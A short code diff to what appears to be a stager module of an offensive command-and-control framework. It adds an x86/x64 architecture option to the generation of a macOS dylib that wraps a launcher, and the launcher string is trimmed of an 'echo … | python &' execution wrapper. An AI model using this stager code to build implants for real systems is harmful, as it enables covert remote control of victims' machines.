@@ -25,6 +25,11 @@ class Stager:
                 'Required'      :   True,
                 'Value'         :   ''
             },
+            'Arch' : {
+                'Description'   :   'Arch: x86/x64',
+                'Required'      :   True,
+                'Value'         :   'x86'
+            },
             'OutFile' : {
                 'Description'   :   'File to write the dylib.',
                 'Required'      :   True,
@@ -65,6 +70,11 @@ class Stager:
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
+        arch = self.options['Arch']['Value']
+
+        if arch == "":
+            print helpers.color("[!] Please select a valid architecture")
+            return ""
 
         # generate the launcher code
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
@@ -76,5 +86,5 @@ class Stager:
         else:
 
             launcher = launcher.strip('echo').strip(' | python &').strip("\"")
-            dylib = self.mainMenu.stagers.generate_dylib(launcher)
+            dylib = self.mainMenu.stagers.generate_dylib(launcher,arch)
             return dylib
